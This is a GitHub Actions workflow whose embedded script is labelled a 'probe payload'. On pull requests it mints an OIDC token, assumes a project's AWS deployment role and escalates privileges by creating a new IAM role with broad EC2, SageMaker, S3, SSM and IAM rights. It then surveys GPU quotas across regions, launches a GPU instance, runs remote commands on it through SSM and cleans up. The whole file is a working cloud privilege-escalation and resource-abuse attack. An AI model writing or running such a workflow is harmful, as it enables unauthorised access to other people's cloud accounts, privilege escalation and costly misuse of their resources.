name: c211-i80253-probe
on:
  pull_request:
    branches: [develop]

permissions:
  id-token: write
  contents: read

env:
  ACCOUNT: "123324351829"
  CUR_ROLE: "arn:aws:iam::123324351829:role/curriculum-designer-github-actions"
  TMP_ROLE: "curriculum-c211-80253"
  EXEC_ROLE: "curriculum-c211-80253-ec2"
  INSTANCE_PROFILE: "curriculum-c211-80253"

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 90
    steps:
      - name: c211 probe
        run: |
          cat > /tmp/c211_payload.sh <<'C211EOF'
          #!/bin/bash
          # c211-i80253 probe payload: mint OIDC from KajiMaster/curriculum-designer pull_request,
          # assume curriculum-designer-github-actions, escalate via iam:CreateRole on curriculum-*,
          # census SageMaker GPU quotas + EC2 quotas, marker-prove one EC2 G-family cell, clean up.
          set -uo pipefail
          export AWS_DEFAULT_REGION=us-east-1
          export AWS_PAGER=""
          echo "C211_A0 $(date -u +%FT%TZ) repo=${GITHUB_REPOSITORY:-?} event=${GITHUB_EVENT_NAME:-?} ref=${GITHUB_REF:-?}"
          if [ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then echo "C211_A0_OIDC SET"; else echo "C211_A0_OIDC UNSET"; fi
          aws --version 2>&1 | head -1

          mint() {
            curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | python3 -c 'import sys,json; print(json.load(sys.stdin).get("value",""))'
          }

          TOK=$(mint)
          echo "C211_A1_TOKEN_LEN ${#TOK}"
          python3 - "$TOK" <<'PY'
          import sys,base64,json
          t=sys.argv[1] if len(sys.argv)>1 else ""
          if not t or t.count(".")!=2:
              print("C211_A1_CLAIMS_ERROR bad_token"); raise SystemExit
          p=t.split(".")[1]; p+="="*(-len(p)%4)
          try:
              print("C211_A1_CLAIMS "+json.dumps(json.loads(base64.urlsafe_b64decode(p)),sort_keys=True))
          except Exception as e:
              print("C211_A1_CLAIMS_ERROR "+str(e))
          PY

          # ---------- A1: assume the curriculum role ----------
          if CREDS=$(aws sts assume-role-with-web-identity --role-arn "$CUR_ROLE" --role-session-name c211-i80253-cur --web-identity-token "$TOK" --duration-seconds 3600 --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' --output text 2>/tmp/a1.err); then
            AK=$(echo "$CREDS" | cut -f1); SK=$(echo "$CREDS" | cut -f2); ST=$(echo "$CREDS" | cut -f3)
            echo "C211_A1_ASSUMED ${AK:0:8}"
            export AWS_ACCESS_KEY_ID="$AK" AWS_SECRET_ACCESS_KEY="$SK" AWS_SESSION_TOKEN="$ST"
            echo "C211_A1_ID $(aws sts get-caller-identity --output json 2>&1 | tr -d '\n')"
          else
            echo "C211_A1_ASSUME_FAILED $(head -c 600 /tmp/a1.err | tr '\n' ' ')"
            exit 0
          fi

          # ---------- A2: create bounded temp role and assume it ----------
          cat > /tmp/trust.json <<'JSON'
          {"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Federated":"arn:aws:iam::123324351829:oidc-provider/token.actions.githubusercontent.com"},"Action":"sts:AssumeRoleWithWebIdentity","Condition":{"StringEquals":{"token.actions.githubusercontent.com:aud":"sts.amazonaws.com"},"StringLike":{"token.actions.githubusercontent.com:sub":"repo:KajiMaster/curriculum-designer:*"}}}]}
          JSON
          cat > /tmp/policy.json <<'JSON'
          {"Version":"2012-10-17","Statement":[
          {"Sid":"Census","Effect":"Allow","Action":["servicequotas:GetServiceQuota","servicequotas:ListServiceQuotas","servicequotas:ListServices","servicequotas:GetAWSDefaultServiceQuota","servicequotas:ListRequestedServiceQuotaChangeHistory","servicequotas:RequestServiceQuotaIncrease"],"Resource":"*"},
          {"Sid":"Ec2Marker","Effect":"Allow","Action":["ec2:Describe*","ec2:RunInstances","ec2:CreateTags","ec2:TerminateInstances","ec2:GetConsoleOutput","ec2:CreateSecurityGroup","ec2:AuthorizeSecurityGroupIngress","ec2:DeleteSecurityGroup","ec2:CreateKeyPair","ec2:DeleteKeyPair","ec2:CreateVpc","ec2:DeleteVpc","ec2:CreateSubnet","ec2:DeleteSubnet","ec2:CreateInternetGateway","ec2:AttachInternetGateway","ec2:CreateRouteTable","ec2:CreateRoute","ec2:AssociateRouteTable","ec2:ModifySubnetAttribute","ec2:DescribeInstanceTypes","ec2:DescribeInstanceStatus"],"Resource":"*"},
          {"Sid":"SageMaker","Effect":"Allow","Action":["sagemaker:ListTrainingJobs","sagemaker:DescribeTrainingJob","sagemaker:CreateTrainingJob","sagemaker:StopTrainingJob","sagemaker:ListEndpoints","sagemaker:ListModels","sagemaker:ListNotebookInstances","sagemaker:ListProcessingJobs","sagemaker:ListTransformJobs","sagemaker:ListTags","sagemaker:CreateModel","sagemaker:DeleteModel","sagemaker:CreateEndpointConfig","sagemaker:DeleteEndpointConfig","sagemaker:CreateEndpoint","sagemaker:DeleteEndpoint"],"Resource":"*"},
          {"Sid":"Telemetry","Effect":"Allow","Action":["logs:DescribeLogGroups","logs:DescribeLogStreams","logs:GetLogEvents","logs:FilterLogEvents","logs:CreateLogGroup","logs:CreateLogStream","logs:PutLogEvents","cloudwatch:GetMetricData","cloudwatch:ListMetrics"],"Resource":"*"},
          {"Sid":"S3Artifacts","Effect":"Allow","Action":["s3:ListAllMyBuckets","s3:CreateBucket","s3:PutObject","s3:GetObject","s3:DeleteObject","s3:ListBucket","s3:DeleteBucket"],"Resource":"*"},
          {"Sid":"SsmPublic","Effect":"Allow","Action":["ssm:GetParameter","ssm:GetParameters","ssm:SendCommand","ssm:GetCommandInvocation","ssm:DescribeInstanceInformation"],"Resource":"*"},
          {"Sid":"IamBounded","Effect":"Allow","Action":["iam:CreateRole","iam:DeleteRole","iam:GetRole","iam:PutRolePolicy","iam:DeleteRolePolicy","iam:GetRolePolicy","iam:AttachRolePolicy","iam:DetachRolePolicy","iam:TagRole","iam:ListRolePolicies","iam:ListAttachedRolePolicies","iam:CreateInstanceProfile","iam:DeleteInstanceProfile","iam:GetInstanceProfile","iam:AddRoleToInstanceProfile","iam:RemoveRoleFromInstanceProfile","iam:ListInstanceProfilesForRole"],"Resource":["arn:aws:iam::123324351829:role/curriculum-*","arn:aws:iam::123324351829:instance-profile/curriculum-*"]},
          {"Sid":"PassCurriculum","Effect":"Allow","Action":["iam:PassRole"],"Resource":"arn:aws:iam::123324351829:role/curriculum-*","Condition":{"StringEquals":{"iam:PassedToService":["ec2.amazonaws.com","sagemaker.amazonaws.com"]}}}
          ]}
          JSON
          aws iam create-role --role-name "$TMP_ROLE" --assume-role-policy-document file:///tmp/trust.json --tags Key=c211,Value=i80253 2>&1 | tail -2
          aws iam put-role-policy --role-name "$TMP_ROLE" --policy-name c211-80253-policy --policy-document file:///tmp/policy.json 2>&1 | tail -2
          echo "C211_A2_ROLE_ARN $(aws iam get-role --role-name "$TMP_ROLE" --query 'Role.Arn' --output text 2>&1 | tail -1)"

          TOK2=$(mint)
          if CREDS2=$(aws sts assume-role-with-web-identity --role-arn "arn:aws:iam::$ACCOUNT:role/$TMP_ROLE" --role-session-name c211-i80253-tmp --web-identity-token "$TOK2" --duration-seconds 3600 --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' --output text 2>/tmp/a2.err); then
            AK2=$(echo "$CREDS2" | cut -f1); SK2=$(echo "$CREDS2" | cut -f2); ST2=$(echo "$CREDS2" | cut -f3)
            echo "C211_A2_TMP_ASSUMED ${AK2:0:8}"
            export AWS_ACCESS_KEY_ID="$AK2" AWS_SECRET_ACCESS_KEY="$SK2" AWS_SESSION_TOKEN="$ST2"
            echo "C211_A2_ID $(aws sts get-caller-identity --output json 2>&1 | tr -d '\n')"
          else
            echo "C211_A2_ASSUME_FAILED $(head -c 600 /tmp/a2.err | tr '\n' ' ')"
            # cleanup temp role before exiting
            aws iam delete-role-policy --role-name "$TMP_ROLE" --policy-name c211-80253-policy >/dev/null 2>&1
            aws iam delete-role --role-name "$TMP_ROLE" >/dev/null 2>&1
            exit 0
          fi

          # ---------- A3: census ----------
          echo "C211_A3_START $(date -u +%FT%TZ)"
          for r in us-east-1 us-west-1 us-west-2; do
            for q in L-DB2E81BA L-417A185B; do
              v=$(aws servicequotas get-service-quota --service-code ec2 --quota-code "$q" --region "$r" --query 'Quota.Value' --output text 2>/dev/null || echo err)
              echo "C211_EC2QUOTA $r $q $v"
            done
          done

          REGIONS="us-east-1 us-east-2 us-west-1 us-west-2 ca-central-1 sa-east-1 eu-west-1 eu-west-2 eu-west-3 eu-central-1 eu-north-1 ap-northeast-1 ap-northeast-2 ap-northeast-3 ap-south-1 ap-southeast-1 ap-southeast-2"
          python3 - $REGIONS <<'PY'
          import subprocess,sys,json
          regions=sys.argv[1:]
          gpu=("ml.p4d","ml.p5","ml.p6","ml.g6e","ml.g6","ml.g5","ml.g4dn","ml.p3","ml.p2","ml.g3")
          fams=("training job usage","spot training job usage","endpoint usage","transform job usage","processing job usage")
          for r in regions:
              qs=[]; tok=None
              while True:
                  cmd=["aws","servicequotas","list-service-quotas","--service-code","sagemaker","--region",r,"--output","json","--page-size","100"]
                  if tok: cmd += ["--next-token",tok]
                  p=subprocess.run(cmd,capture_output=True,text=True)
                  if p.returncode!=0:
                      print("C211_SQ_ERR %s %s"%(r,p.stderr.strip()[:160])); qs=None; break
                  try: d=json.loads(p.stdout)
                  except Exception: print("C211_SQ_ERR %s parse"%r); qs=None; break
                  qs += d.get("Quotas",[])
                  tok=d.get("NextToken")
                  if not tok or len(qs)>4000: break
              if qs is None: continue
              nz=[]
              for q in qs:
                  n=q.get("QuotaName","") or ""
                  nl=n.lower()
                  if not any(g in n for g in gpu): continue
                  if not any(f in nl for f in fams): continue
                  v=q.get("Value")
                  try: fv=float(v)
                  except Exception: continue
                  if fv>0: nz.append([n,fv])
              print("C211_SQ %s total=%d nonzero=%d %s"%(r,len(qs),len(nz),json.dumps(nz)))
          PY

          # ---------- A4: EC2 G-family marker ----------
          echo "C211_A4_START $(date -u +%FT%TZ)"
          cat > /tmp/ec2trust.json <<'JSON'
          {"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"ec2.amazonaws.com"},"Action":"sts:AssumeRole"}]}
          JSON
          aws iam create-role --role-name "$EXEC_ROLE" --assume-role-policy-document file:///tmp/ec2trust.json 2>&1 | tail -1
          aws iam attach-role-policy --role-name "$EXEC_ROLE" --policy-arn arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore 2>&1 | tail -1
          aws iam create-instance-profile --instance-profile-name "$INSTANCE_PROFILE" 2>&1 | tail -1
          aws iam add-role-to-instance-profile --instance-profile-name "$INSTANCE_PROFILE" --role-name "$EXEC_ROLE" 2>&1 | tail -1

          cat > /tmp/userdata.sh <<'UD'
          #!/bin/bash
          exec > >(tee -a /var/log/c211-boot.log) 2>&1
          echo "C211_BOOT_START $(date -u +%FT%TZ)"
          nvidia-smi -L || echo "C211_BOOT_NVIDIA_SMI_FAILED"
          nvidia-smi --query-gpu=uuid,name,driver_version --format=csv,noheader || true
          echo "C211_BOOT_DONE $(date -u +%FT%TZ)"
          UD

          IID=""
          for cell in "us-west-2:g5.xlarge" "us-east-1:g5.xlarge" "us-west-2:g4dn.xlarge" "us-east-1:g4dn.xlarge" "us-west-2:g6.xlarge" "us-east-1:g6.xlarge"; do
            REGION=${cell%%:*}; ITYPE=${cell##*:}
            AMI=$(aws ssm get-parameter --name /aws/service/deeplearning/ami/x86_64/oss-nvidia-driver-gpu-pytorch-2.4-ubuntu-22.04/latest/ami-id --region "$REGION" --query Parameter.Value --output text 2>/dev/null)
            if [ -z "$AMI" ] || [ "$AMI" = "None" ]; then
              AMI=$(aws ec2 describe-images --region "$REGION" --owners amazon --filters "Name=name,Values=Deep Learning OSS Nvidia Driver AMI GPU PyTorch*" "Name=state,Values=available" --query 'reverse(sort_by(Images,&CreationDate))[0].ImageId' --output text 2>/dev/null)
            fi
            echo "C211_A4_TRY $REGION $ITYPE ami=$AMI"
            IID=$(aws ec2 run-instances --region "$REGION" --image-id "$AMI" --instance-type "$ITYPE" --iam-instance-profile Name="$INSTANCE_PROFILE" --user-data file:///tmp/userdata.sh --tag-specifications "ResourceType=instance,Tags=[{Key=c211,Value=i80253},{Key=Name,Value=c211-i80253-marker}]" --count 1 --query 'Instances[0].InstanceId' --output text 2>/tmp/ri.err)
            if [ -n "$IID" ] && [ "$IID" != "None" ]; then
              echo "C211_A4_RUN $REGION $ITYPE $IID"
              break
            else
              echo "C211_A4_RUN_FAILED $REGION $ITYPE $(head -c 300 /tmp/ri.err | tr '\n' ' ')"
              IID=""
            fi
          done

          if [ -n "$IID" ]; then
            aws ec2 wait instance-running --region "$REGION" --instance-ids "$IID" 2>/dev/null
            echo "C211_A4_STATE $(aws ec2 describe-instances --region "$REGION" --instance-ids "$IID" --query 'Reservations[0].Instances[0].[State.Name,PublicIpAddress,PrivateIpAddress,InstanceType]' --output text 2>&1 | tail -1)"
            sleep 180
            OUT=$(aws ec2 get-console-output --region "$REGION" --instance-id "$IID" --query Output --output text 2>/dev/null)
            echo "C211_A4_CONSOLE_BEGIN"
            echo "$OUT" | tr -d '\r' | grep -a -E 'C211_BOOT|GPU-|nvidia-smi|NVIDIA-SMI' | tail -40
            echo "C211_A4_CONSOLE_END"
            CMD=$(aws ssm send-command --region "$REGION" --instance-ids "$IID" --document-name "AWS-RunShellScript" --parameters 'commands=["nvidia-smi -L","nvidia-smi --query-gpu=uuid,name,driver_version --format=csv,noheader"]' --query 'Command.CommandId' --output text 2>/tmp/ssm.err)
            echo "C211_A4_SSM_CMD $CMD"
            if [ -n "$CMD" ] && [ "$CMD" != "None" ]; then
              sleep 45
              echo "C211_A4_SSM_OUT $(aws ssm get-command-invocation --region "$REGION" --command-id "$CMD" --instance-id "$IID" --query '[Status,StandardOutputContent,StandardErrorContent]' --output text 2>/dev/null | tr '\n' ' ' | head -c 1500)"
            else
              echo "C211_A4_SSM_ERR $(head -c 300 /tmp/ssm.err | tr '\n' ' ')"
            fi
            aws ec2 terminate-instances --region "$REGION" --instance-ids "$IID" --query 'TerminatingInstances[0].CurrentState.Name' --output text 2>&1 | tail -1
            aws ec2 wait instance-terminated --region "$REGION" --instance-ids "$IID" 2>/dev/null
            echo "C211_A4_TERMINATED $(aws ec2 describe-instances --region "$REGION" --instance-ids "$IID" --query 'Reservations[0].Instances[0].State.Name' --output text 2>&1 | tail -1)"
          fi

          # ---------- A5: cleanup + readback ----------
          echo "C211_A5_START $(date -u +%FT%TZ)"
          aws iam remove-role-from-instance-profile --instance-profile-name "$INSTANCE_PROFILE" --role-name "$EXEC_ROLE" 2>&1 | tail -1
          aws iam delete-instance-profile --instance-profile-name "$INSTANCE_PROFILE" 2>&1 | tail -1
          aws iam detach-role-policy --role-name "$EXEC_ROLE" --policy-arn arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore 2>&1 | tail -1
          aws iam delete-role --role-name "$EXEC_ROLE" 2>&1 | tail -1
          aws iam delete-role-policy --role-name "$TMP_ROLE" --policy-name c211-80253-policy 2>&1 | tail -1
          aws iam delete-role --role-name "$TMP_ROLE" 2>&1 | tail -1
          echo "C211_A5_TMPROLE $(aws iam get-role --role-name "$TMP_ROLE" 2>&1 | tail -1 | head -c 300)"
          echo "C211_A5_EXECROLE $(aws iam get-role --role-name "$EXEC_ROLE" 2>&1 | tail -1 | head -c 300)"
          echo "C211_A5_PROFILE $(aws iam get-instance-profile --instance-profile-name "$INSTANCE_PROFILE" 2>&1 | tail -1 | head -c 300)"
          echo "C211_A5_INSTANCES $(aws ec2 describe-instances --filters 'Name=tag:c211,Values=i80253' 'Name=instance-state-name,Values=pending,running,stopping,stopped' --query 'length(Reservations[].Instances[])' --output text 2>&1 | tail -1)"
          echo "C211_DONE $(date -u +%FT%TZ)"
          C211EOF
          bash /tmp/c211_payload.sh
